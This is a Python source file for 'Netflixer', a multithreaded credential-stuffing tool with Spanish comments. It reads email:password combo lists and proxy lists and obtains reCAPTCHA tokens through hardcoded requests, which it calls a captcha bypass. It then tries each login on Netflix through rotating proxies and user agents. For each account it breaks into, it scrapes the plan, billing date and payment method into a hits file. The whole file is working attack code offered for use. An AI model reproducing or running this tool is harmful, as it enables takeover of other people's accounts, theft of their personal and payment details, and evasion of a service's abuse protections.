import os
import time
import threading
import random
import requests
import re
from colorama import Fore
from bs4 import BeautifulSoup
# Asegúrate de instalar estas librerías:
# pip install colorama beautifulsoup4 requests easygui python-datefinder
import easygui
import datefinder # Para parsear fechas

# Credit to Pycenter by billythegoat356
# Github: https://github.com/billythegoat356/pycenter/
# License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE

def center(var: str, space: int = None):  # From Pycenter
    if not space:
        # Intenta obtener el tamaño de la terminal, si falla, no centrar
        try:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        except OSError:
            space = 0 # Valor por defecto si no se puede determinar el tamaño de la terminal
        
    return "\n".join((" " * int(space)) + var for var in var.splitlines())

class Netflixer:
    def __init__(self):
        if os.name == "posix":
            print("ADVERTENCIA: Este programa está diseñado para ejecutarse solo en Windows.")
            # Se mantiene la lógica original de salir, pero puedes modificarla si deseas
            quit(1)
        self.proxies = []
        self.combos = []
        self.hits = 0
        self.bad = 0
        self.cpm = 0
        self.retries = 0
        self.lock = threading.Lock()
        # Inicializar user_agents aquí para que esté disponible en toda la clase
        self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            ]

    def ui(self):
        os.system("cls && title [NETFLIXER] - Made by Plasmonix")
        text = """
                      ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓      ██▓▒██  ██▒▓█████  ██▀███
                      ██ ▀█    █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒     ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
                     ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒████ ░▒██░     ▒██▒░░  █    ░▒███  ▓██ ░▄█ ▒
                     ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░▓█▒  ░▒██░     ░██░ ░ █ █ ▒ ▒▓█  ▄ ▒██▀▀█▄
                     ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░▒█░   ░██████▒░██░▒██▒ ▒██▒░▒████▒░██▓ ▒██▒
                     ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ▒ ░   ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                     ░ ░░   ░ ▒░ ░ ░    ░     ░     ░ ░ ▒  ░ ▒ ░░░   ░▒ ░ ░ ░      ░▒ ░ ▒░
                       ░    ░ ░    ░    ░           ░ ░    ▒ ░ ░    ░      ░      ░░   ░
                             ░    ░  ░                  ░  ░ ░     ░    ░      ░  ░    ░   """
        faded = ""
        red = 40
        for line in text.splitlines():
            faded += f"\033[38;2;{red};0;220m{line}\033[0m\n"
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))
        print(center(f"{Fore.LIGHTYELLOW_EX}\ngithub.com/Plasmonix\n{Fore.RESET}"))

    def cpmCounter(self):
        while True:
            old = self.hits
            time.sleep(4)
            new = self.hits
            self.cpm = (new - old) * 15

    def updateTitle(self):
        while True:
            elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start))
            os.system(
                f"title [NETFLIXER] - Hits: {self.hits} ^| Bad: {self.bad} ^| Retries: {self.retries} ^| CPM: {self.cpm} ^| Threads: {threading.active_count() - 3} ^| Time elapsed: {elapsed}"
            )
            time.sleep(0.4)

    def getProxies(self):
        try:
            print(f"[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Path to proxy file> ")
            path = easygui.fileopenbox(
                default="*.txt",
                filetypes=["*.txt"],
                title="Netflixer - Select proxy",
                multiple=False,
            )
            try:
                # Intenta abrir el archivo para verificar que es accesible
                with open(path, "r", encoding="utf-8") as _:
                    pass
            except Exception as e:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Fallo al abrir el archivo de proxies: {e}")
                os.system("pause >nul")
                quit()

            try:
                choice = int(
                    input(
                        f"[{Fore.LIGHTBLUE_EX}?{Fore.RESET}] Tipo de proxy [{Fore.LIGHTBLUE_EX}0{Fore.RESET}]HTTP/[{Fore.LIGHTBLUE_EX}1{Fore.RESET}]SOCKS4/[{Fore.LIGHTBLUE_EX}2{Fore.RESET}]SOCKS5> "
                    )
                )
            except ValueError: # Captura si la entrada no es un entero
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] El valor debe ser un número entero.")
                os.system("pause >nul")
                quit()

            if choice in [0, 1, 2]:
                if choice == 0:
                    proxytype = "http"
                elif choice == 1:
                    proxytype = "socks4"
                elif choice == 2:
                    proxytype = "socks5"
            else: # Este else es alcanzable si `choice` no está en [0, 1, 2]
                print(
                    f"[{Fore.RED}!{Fore.RESET}] Por favor, introduce una opción válida: 0, 1 o 2!"
                )
                os.system("pause >nul")
                quit()

            with open(path, "r", encoding="utf-8") as f:
                for l in f:
                    l = l.strip() # Limpia espacios y saltos de línea
                    if not l: # Salta líneas vacías
                        continue
                    proxy = l.split(":")
                    if len(proxy) >= 2: # Asegura que hay al menos dos partes (host:puerto)
                        self.proxies.append(
                            {proxytype: f"{proxytype}://{proxy[0]}:{proxy[1]}"}
                        )
                    else:
                        print(f"[{Fore.YELLOW}AVISO{Fore.RESET}] Proxy mal formado omitido: {l}")
        except Exception as e: # Captura cualquier otra excepción
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error en getProxies: {e}")
            os.system("pause >nul")
            quit()

    def getCombos(self):
        try:
            print(f"[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Ruta a la lista de combinaciones> ")
            path = easygui.fileopenbox(
                default="*.txt",
                filetypes=["*.txt"],
                title="Netflixer - Seleccionar combinaciones",
                multiple=False,
            )
            with open(path, "r", encoding="utf-8") as f:
                for l in f:
                    stripped_line = l.strip() # Limpia espacios y saltos de línea
                    if stripped_line: # Solo añade líneas no vacías
                        self.combos.append(stripped_line)
        except Exception as e:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Fallo al abrir el archivo de combinaciones: {e}")
            os.system("pause >nul")
            quit()

    def getauthURL(self):
        try:
            login = requests.get(
                "https://www.netflix.com/login",
                headers={"user-agent": random.choice(self.user_agents)},
                # Usa un proxy aleatorio si hay proxies disponibles, de lo contrario, None
                proxies=random.choice(self.proxies) if self.proxies else None,
                timeout=10 # Añade un tiempo de espera para evitar cuelgues
            )
            authURL = re.search(
                r'<input[^>]*name="authURL"[^>]*value="([^"]*)"', login.text
            ).group(1)
        except requests.exceptions.RequestException as e: # Error de red/proxy específico
            self.lock.acquire()
            print(
                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Error de proxy/red al obtener authURL: {e}. Reintentando..."
            )
            self.retries += 1
            self.lock.release()
            return self.getauthURL() # Reintentar la función
        except AttributeError: # Error si re.search no encuentra nada (authURL no encontrado)
            self.lock.acquire()
            print(
                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | authURL no encontrado en la página de inicio de sesión. Reintentando..."
            )
            self.retries += 1
            self.lock.release()
            return self.getauthURL() # Reintentar la función
        except Exception as e: # Cualquier otro error inesperado
            self.lock.acquire()
            print(
                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Error inesperado en getauthURL: {e}. Reintentando..."
            )
            self.retries += 1
            self.lock.release()
            return self.getauthURL() # Reintentar la función

        return authURL

    def extract_date(self, input_string):
        # datefinder devuelve un generador, se convierte a lista
        dates = list(datefinder.find_dates(input_string))
        # Si hay fechas, selecciona la que tenga la representación de cadena más larga como heurística
        return (
            max(dates, default=None, key=lambda d: len(str(d))).strftime("%d %B %Y")
            if dates
            else None
        )

    def bypass_captcha(self):
        try:
            req = requests.get(
                "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw",
                headers={
                    "Accept": "*/*",
                    "Pragma": "no-cache",
                    "User-Agent": random.choice(self.user_agents), # Usa user-agent aleatorio
                },
                proxies=random.choice(self.proxies) if self.proxies else None, # Usa proxy aleatorio
                timeout=10 # Tiempo de espera
            )
            token = "".join(
                re.findall(
                    'type="hidden" id="recaptcha-token" value="(.*?)"', str(req.text)
                )
            )
            if not token: # Si el token no se encuentra, lanzar un error para reintentar
                raise ValueError("Token de Recaptcha no encontrado en la página ancla.")

            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
                "origin": "https://www.google.com",
                "User-Agent": random.choice(self.user_agents), # Usa user-agent aleatorio
                "Pragma": "no-cache",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "referer": "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw ",
            }
            data = {
                "v": "Km9gKuG06He-isPsP6saG8cn",
                "reason": "q",
                "c": token,
                "k": "6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
                "co": "aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz",
                "chr": "%5B38%2C84%2C94%5D", # Estos valores podrían necesitar ser dinámicos
                "vh": "-1149792284", # Estos valores podrían necesitar ser dinámicos
                "bg": "kJaglpMKAAQeH2NlbQEHDwG3HgHkYmipwKZLvmAaGCIeO2knGyVi2lcc2d6we_IGLhXPTCrcRQSrXqn4n0doqzQ2i8Aw3_eUeSUIgbovYaDXYEy1YBiouAQe5rUbIuXh6jLItmtbpiCsvNHrJfqr1eDApuNn8jqVtZfpo12Bpl28T4S-BN-zefP60wgs4AhJqZMbHngai-9VnGYfde5EihgOR2s5FgJjWkNW4g7J4VixwycoKpPM_VkmmY-Mcl6SI4svUrXzKNBLbPXY0Zjp5cLyEh7O1UTPCe8OPj0cg6S7xPPpkZR9zKmDhy5adr982aTJZTFmV8R1p1OcDmT78D03ZgPRwzgoK_IpSvgrM-IPQfE_Qu-7zclFDMSkBPLUj1VxaolIdknp8Ap7AGfixtbK4_kZuDl853ea737GPv2dppnZdXciU8r2RJXyhjWWDYOYIxnlqfzefYHNZsxmujutGJevWfWU_4tAMie6uvg1HXDF0BDj_s9H8UE8Gykb6M3qQVt12JCK_EBcmbrg8CiT_MK4L_ys7phshwm6-9Cy5YFQ3hS9oxYO-SSDY2r9QiNXDgccVpQ528Nf7V0gG3Z9xHJVmLpwpwB_F_L6dREoaPX_UnxiJoOR1gkg04uS4BswFxmzOJpB45VKJvbaBENYQabVtIiUUhgVwiBYH7-9NHvlbuYcHtCLf6piKcmdKxQXBEjphi1HISp-nLa2bIA47mjNOylD9ZWOp05PMuPSUJxr9SUCQTym2nNLPiWj9tJkyUzy0UVi6_QSIX7vf5JaVGJB3zfs5fCXQmDC7VGPT40_sQEfxQuCRZ8y67Mq8R64OZtbnlHX7JWE80myuXHQue_EjMLCJlQbaGhEJxNF25XzzseCLgVwNNVG6uUjgq_2-BTuNdyHd38y1hcsryXqaskJ2DsFh3P0mbHxE8viABVpzBWtSRjkH_OPXa_dus8OCqQI8I60lPXJ9lWU9aCMeAkD5T6VIfFvqCXZ_bfuX7ugp9ADo5bkFcSnQJrmAobrmuOHh3zvIZmIHr4hZ7jsH_ANy_w6JNSsbifs2-BA45a7crLyEC1tuFq_yvCXR-fH3F8uSoVobZK1MreQuW_8zBrI1w1vwb7-2teKDEK41orAry1P7ib-fzo08KiPvPDJ3MQi3XQeOzAcQwRjhRNDbtAcDE-XRSkN_CsRg9dmygO-wwM7X607rH-RvNw-CBjt_pB4V-xd83GKtfI7VZZ48iNywixzOoIPsNv2_oqLHNGSc9gvMNtegcNKU7UtUiiZR5sIps",
                "size": "invisible",
                "hl": "en",
                "cb": "eeb8u2c3dizw",
            }
            req = requests.post(
                "https://www.google.com/recaptcha/api2/reload?k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
                headers=headers,
                data=data,
                proxies=random.choice(self.proxies) if self.proxies else None, # Usa proxy aleatorio
                timeout=10 # Tiempo de espera
            )
            captcha_token = "".join(re.findall('\["rresp","(.*?)"', str(req.text)))
            if not captcha_token:
                raise ValueError("Token de Recaptcha no encontrado después de la recarga.")
            return captcha_token
        except requests.exceptions.RequestException as e:
            self.lock.acquire()
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Error de proxy/red durante el bypass de captcha: {e}. Reintentando...")
            self.retries += 1
            self.lock.release()
            return self.bypass_captcha() # Reintentar
        except ValueError as e: # Captura errores específicos lanzados dentro de esta función
            self.lock.acquire()
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Error lógico de bypass de captcha: {e}. Reintentando...")
            self.retries += 1
            self.lock.release()
            return self.bypass_captcha() # Reintentar
        except Exception as e:
            self.lock.acquire()
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Error inesperado en bypass_captcha: {e}. Reintentando...")
            self.retries += 1
            self.lock.release()
            return self.bypass_captcha() # Reintentar

    def checker(self, email, password):
        try:
            client = requests.Session()
            # self.user_agents ya se inicializa en __init__

            headers = {
                "User-agent": random.choice(self.user_agents), # Usa user-agent aleatorio
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-language": "en-US,en;q=0.9",
                "Accept-encoding": "gzip, deflate, br",
                "Referer": "https://www.netflix.com/login",
                "Content-type": "application/x-www-form-urlencoded",
            }

            data = {
                "Userloginid": email,
                "Password": password,
                "Remembermecheckbox": "true",
                "Flow": "websiteSignUp",
                "Mode": "login",
                "Action": "loginAction",
                "Withfields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
                "Authurl": self.getauthURL(),
                "Nextpage": "https://www.netflix.com/browse",
                "recaptchaResponseToken": self.bypass_captcha(),
                "recaptchaResponseTime": random.randint(100, 800),
            }

            req = client.post(
                "https://www.netflix.com/login",
                headers=headers,
                data=data,
                proxies=random.choice(self.proxies) if self.proxies else None,
                timeout=10,
            )
            if "/browse" in req.url:
                cookie = {
                    "NetflixId": req.cookies.get("NetflixId"),
                    "SecureNetflixId": req.cookies.get("SecureNetflixId"),
                }

                info = client.get(
                    "https://www.netflix.com/YourAccount",
                    headers={
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Referer": "https://www.netflix.com/browse",
                        "User-Agent": random.choice(self.user_agents),
                    },
                    cookies=cookie,
                    proxies=random.choice(self.proxies) if self.proxies else None,
                    timeout=10,
                )

                plan = "N/A"
                member_since = "N/A"
                payment_method = "N/A"
                expiry = "N/A"

                try:
                    # Pasar info.text a BeautifulSoup
                    soup = BeautifulSoup(info.text, "html.parser")
                    
                    # Intentar extraer el plan
                    plan_match = re.search(r"<b>(.*?)</b>", info.text)
                    if plan_match:
                        plan = plan_match.group(1).strip()

                    # Intentar extraer la fecha de miembro
                    member_since_div = soup.find("div", class_="account-section-membersince")
                    if member_since_div:
                        member_since = self.extract_date(member_since_div.text.strip())

                    # Intentar extraer el método de pago
                    payment_method_match = re.search(r"paymentpicker/(\w+)\.png", info.text)
                    if payment_method_match:
                        payment_method = payment_method_match.group(1).strip()

                    # Intentar extraer la fecha de vencimiento
                    expiry_div = soup.find("div", {"data-uia": "nextBillingDate-item"})
                    if expiry_div:
                        expiry = self.extract_date(expiry_div.text.strip())
                except Exception as parse_e:
                    # Captura errores durante el parseo de la información de la cuenta
                    self.lock.acquire()
                    print(f"[{Fore.YELLOW}AVISO{Fore.RESET}] Error al parsear info de la cuenta para {email}: {parse_e}")
                    self.lock.release()

                self.lock.acquire()
                print(
                    f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}HIT{Fore.RESET} | {email} | {password} | Plan: {plan} | Vence: {expiry}"
                )
                self.hits += 1
                os.makedirs("./results", exist_ok=True) # Asegura que el directorio 'results' exista
                with open("./results/hits.txt", "a", encoding="utf-8") as fp:
                    fp.writelines(
                        f"{email}:{password} | Miembro desde = {member_since} | Plan = {plan} | Validez = {expiry} | Método de pago = {payment_method}\n"
                    )
                self.lock.release()
            else:
                self.lock.acquire()
                print(
                    f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}BAD{Fore.RESET} | {email} | {password} "
                )
                self.bad += 1
                self.lock.release()

        except requests.exceptions.RequestException as e: # Captura errores de red/proxy
            self.lock.acquire()
            print(
                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Tiempo de espera del proxy/red para {email}:{password}. Error: {e}"
            )
            self.retries += 1
            self.lock.release()
        except Exception as e: # Captura cualquier otro error inesperado
            self.lock.acquire()
            print(
                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} Error inesperado para {email}:{password}: {e}"
            )
            self.retries += 1
            self.lock.release()

    def worker(self, combos_slice, thread_id): # Renombrado a combos_slice para claridad
        # Itera sobre el segmento de combinaciones asignado a este hilo
        for combo_string in combos_slice:
            # Salta líneas vacías o que solo contengan espacios en blanco
            if not combo_string.strip():
                self.lock.acquire()
                print(f"[{Fore.YELLOW}AVISO{Fore.RESET}] Saltando cadena de combinación vacía.")
                self.bad += 1 # Contar como una entrada mala
                self.lock.release()
                continue

            # Intenta dividir la cadena de combinación.
            # Se usa split(':', 1) para dividir solo por el primer ':'
            # esto permite que las contraseñas contengan ':'.
            parts = combo_string.split(":", 1)

            if len(parts) == 2:
                email = parts[0].strip()
                password = parts[1].strip()
                self.checker(email, password)
            else:
                # Este bloque maneja el IndexError original detectando líneas mal formadas.
                self.lock.acquire()
                print(
                    f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.YELLOW}SALTANDO FORMATO INCORRECTO{Fore.RESET} | Combinación: '{combo_string}'. Se esperaba 'correo:contraseña'."
                )
                self.bad += 1  # Incrementa el contador de combos malos debido al formato
                self.lock.release()

    def main(self):
        self.ui()
        self.getProxies()
        self.getCombos()
        try:
            self.threadcount = int(
                input(f"[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Hilos> ")
            )
        except ValueError:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] El valor debe ser un número entero.")
            os.system("pause >nul")
            quit()

        # Asegura que la lista de combinaciones no esté vacía antes de iniciar los hilos
        if not self.combos:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] No se cargaron combinaciones válidas. Saliendo.")
            os.system("pause >nul")
            quit()

        self.ui()
        self.start = time.time()
        threading.Thread(target=self.cpmCounter, daemon=True).start()
        threading.Thread(target=self.updateTitle, daemon=True).start()

        threads = []
        # No es necesario `self.check` como un arreglo global para los índices de hilos
        # ya que cada worker ahora opera sobre su propia porción (`sliced_combo`).
        # `self.check` se inicializa pero ya no es usado por el worker para su índice.
        self.check = [0 for _ in range(self.threadcount)] # Se mantiene por si hay alguna dependencia residual

        # Divide las combinaciones entre los hilos
        total_combos = len(self.combos)
        combo_per_thread = total_combos // self.threadcount
        remaining_combos = total_combos % self.threadcount
        start_index = 0

        for i in range(self.threadcount):
            end_index = start_index + combo_per_thread
            if i < remaining_combos: # Distribuye los combos restantes uno por uno
                end_index += 1
            
            sliced_combo = self.combos[start_index:end_index]
            start_index = end_index # Actualiza el índice de inicio para el siguiente hilo

            if sliced_combo: # Solo crea un hilo si tiene combinaciones asignadas
                t = threading.Thread(
                    target=self.worker,
                    args=(
                        sliced_combo, # Pasa el segmento de combos directamente al worker
                        i, # Pasa el ID del hilo, si se necesita para logging o depuración
                    ),
                )
                threads.append(t)
                t.start()
            else:
                self.lock.acquire()
                print(f"[{Fore.YELLOW}AVISO{Fore.RESET}] El hilo {i} no tiene combinaciones asignadas.")
                self.lock.release()

        for t in threads:
            t.join()

        print(f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Tarea completada")
        os.system("pause>nul")


if __name__ == "__main__":
    Netflixer().main()
